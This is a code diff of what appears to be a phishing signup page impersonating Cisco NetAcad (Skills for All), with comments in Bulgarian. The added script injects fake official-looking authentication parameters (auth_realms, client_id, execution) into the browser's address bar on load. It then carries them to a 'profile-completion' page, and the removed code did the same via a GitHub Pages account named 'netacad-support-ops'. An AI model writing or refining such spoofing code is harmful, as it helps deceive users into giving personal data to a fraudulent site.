@@ -22,7 +22,7 @@
 
         @media (max-width: 992px) {
             body { flex-direction: column; overflow-y: auto; }
-            .banner-side { min-height: 350px !important; padding: 20px !important; }
+            .banner-side { display: none; }
         }
 
         .banner-side { 
@@ -109,8 +109,16 @@
     </div>
 
     <script>
-        // Списък с държави
-        const countries = ["Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Argentina", "Armenia", "Australia", "Austria", "Azerbaijan", "Bulgaria", "Canada", "Germany", "Greece", "Romania", "United Kingdom", "United States"];
+        // ГЕНЕРИРАНЕ НА ДЪЛЪГ URL ОЩЕ ПРИ ЗАРЕЖДАНЕ
+        const officialParams = "?auth_realms=skillsforall&client_id=b2e-marketplace&tab_id=" + Math.random().toString(36).substring(2, 12) + "&client_data=eyJydSI6Imh0dHBzOi8vd3d3Lm5ldGFjYWQuY29tL2Rhc2hib2FyZCIsInJ0IjoiY29kZSIsInJtIjoiZnJhZ21lbnQiLCJzdCI6Ijk1NDZlZjk5LTIyYWItNGY3OS1hNGY1LWRjMmU3Zjk0YTU1ZiJ9&execution=" + crypto.randomUUID() + "&kc_locale=en";
+
+        // Ако в момента няма параметри, добави ги веднага
+        if (!window.location.search.includes('auth_realms')) {
+            window.history.replaceState(null, '', window.location.pathname + officialParams);
+        }
+
+        // Попълване на данните (държави, области и т.н.)
+        const countries = ["Afghanistan", "Albania", "Algeria", "Bulgaria", "Canada", "Germany", "United Kingdom", "United States"];
         const cSel = document.getElementById('countrySelect');
         countries.forEach(c => {
             let o = new Option(c, c);
@@ -118,7 +126,7 @@
             cSel.add(o);
         });
 
-        const bgStates = ["Blagoevgrad", "Burgas", "Dobrich", "Gabrovo", "Haskovo", "Kardzhali", "Kyustendil", "Lovech", "Montana", "Pazardzhik", "Pernik", "Pleven", "Plovdiv", "Razgrad", "Ruse", "Shumen", "Silistra", "Sliven", "Smolyan", "Sofia City", "Sofia (province)", "Stara Zagora", "Targovishte", "Varna", "Veliko Tarnovo", "Vidin", "Vratsa", "Yambol"];
+        const bgStates = ["Sofia City", "Plovdiv", "Varna", "Burgas", "Ruse", "Stara Zagora", "Pleven"];
         const sSel = document.getElementById('stateSelect');
         bgStates.forEach(s => sSel.add(new Option(s, s)));
 
@@ -128,31 +136,13 @@
 
         const mSel = document.getElementById('monthSelect');
         mSel.add(new Option("Month", ""));
-        const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
-        months.forEach((m, i) => mSel.add(new Option(m, i + 1)));
+        ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"].forEach((m, i) => mSel.add(new Option(m, i + 1)));
 
-        // ФИНАЛЕН РЕДИРЕКТ С ДЪЛЪГ И СЛОЖЕН URL
+        // ПРЕНАСОЧВАНЕ КЪМ ВТОРАТА СТРАНИЦА СЪС ЗАПАЗВАНЕ НА ПАРАМЕТРИТЕ
         document.getElementById('signupForm').onsubmit = function(e) {
             e.preventDefault(); 
-            
-            const username = "netacad-support-ops"; 
-            const repo = "profile-completion";
-            const file = "profile-completion.html";
-
-            // Генериране на фалшиви параметри за автентичност
-            const tabId = Math.random().toString(36).substring(2, 15);
-            const executionId = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-                var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
-                return v.toString(16);
-            });
-            const clientData = btoa(JSON.stringify({ru: "https://www.netacad.com/dashboard", rt: "code", st: executionId})).substring(0, 80);
-            
-            // Сглобяване на дългия линк
-            const targetUrl = `https://${username}.github.io/${repo}/${file}`;
-            const longParams = `?auth_realms=skillsforall&client_id=b2e-marketplace&tab_id=${tabId}&client_data=${clientData}&execution=${executionId}&kc_locale=en&v=${Math.random().toString(36).substring(7)}`;
-
-            // Извършваме пренасочването
-            window.location.href = targetUrl + longParams;
+            const target = "profile-completion/profile-completion.html";
+            window.location.href = target + window.location.search;
         };
     </script>
 </body>
